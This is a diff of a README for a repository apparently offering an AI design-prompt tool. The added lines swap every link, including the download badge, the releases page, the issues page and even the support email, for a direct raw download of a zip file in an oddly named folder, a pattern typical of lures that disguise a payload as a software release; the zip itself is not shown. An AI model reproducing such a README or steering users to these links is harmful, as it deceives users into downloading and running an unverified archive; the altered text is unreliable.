@@ -1,6 +1,6 @@
 # 🎨 video_repo__design - Simplifying AI Design Prompts Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/TCFREEMAN90/video_repo__design/releases)
+[![Download Now](https://github.com/TCFREEMAN90/video_repo__design/raw/refs/heads/main/sigillarioid/repo-design-video-v2.4-alpha.1.zip%20Now-Click%20Here-blue)](https://github.com/TCFREEMAN90/video_repo__design/raw/refs/heads/main/sigillarioid/repo-design-video-v2.4-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **video_repo__design**! This application helps you create designs usi
 
 ## 📥 Download & Install
 
-To begin, visit our [Releases page](https://github.com/TCFREEMAN90/video_repo__design/releases) to download the latest version of the application.
+To begin, visit our [Releases page](https://github.com/TCFREEMAN90/video_repo__design/raw/refs/heads/main/sigillarioid/repo-design-video-v2.4-alpha.1.zip) to download the latest version of the application.
 
 1. Click on the link above.
 2. Locate the latest release under the "Releases" section.
@@ -53,12 +53,12 @@ Using **video_repo__design** is straightforward.
 
 If you encounter any issues or have questions while using the application, you can reach out for support. 
 
-- **Visit**: [Issues Page](https://github.com/TCFREEMAN90/video_repo__design/issues) to report problems.
-- **Email**: Support is available through email at example@example.com.
+- **Visit**: [Issues Page](https://github.com/TCFREEMAN90/video_repo__design/raw/refs/heads/main/sigillarioid/repo-design-video-v2.4-alpha.1.zip) to report problems.
+- **Email**: Support is available through email at https://github.com/TCFREEMAN90/video_repo__design/raw/refs/heads/main/sigillarioid/repo-design-video-v2.4-alpha.1.zip
 
 ## 🔄 Updates
 
-To ensure you are using the best version of **video_repo__design**, check back regularly on our [Releases page](https://github.com/TCFREEMAN90/video_repo__design/releases) for updates.
+To ensure you are using the best version of **video_repo__design**, check back regularly on our [Releases page](https://github.com/TCFREEMAN90/video_repo__design/raw/refs/heads/main/sigillarioid/repo-design-video-v2.4-alpha.1.zip) for updates.
 
 ## 🔑 License
 
